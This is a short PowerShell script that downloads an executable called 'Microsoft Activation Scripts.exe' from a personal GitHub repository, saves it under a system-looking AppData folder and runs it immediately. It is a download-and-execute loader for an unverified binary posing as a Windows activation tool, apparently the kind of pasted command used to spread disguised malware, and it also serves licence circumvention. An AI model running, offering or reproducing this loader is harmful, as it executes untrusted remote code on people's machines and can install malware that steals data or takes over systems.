$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"

$bytes = (New-Object System.Net.WebClient).DownloadData($url)

$tempFile = "$env:APPDATA\Microsoft\Windows\MAS.exe"
[System.IO.File]::WriteAllBytes($tempFile, $bytes)

# Стартиране
& $tempFile
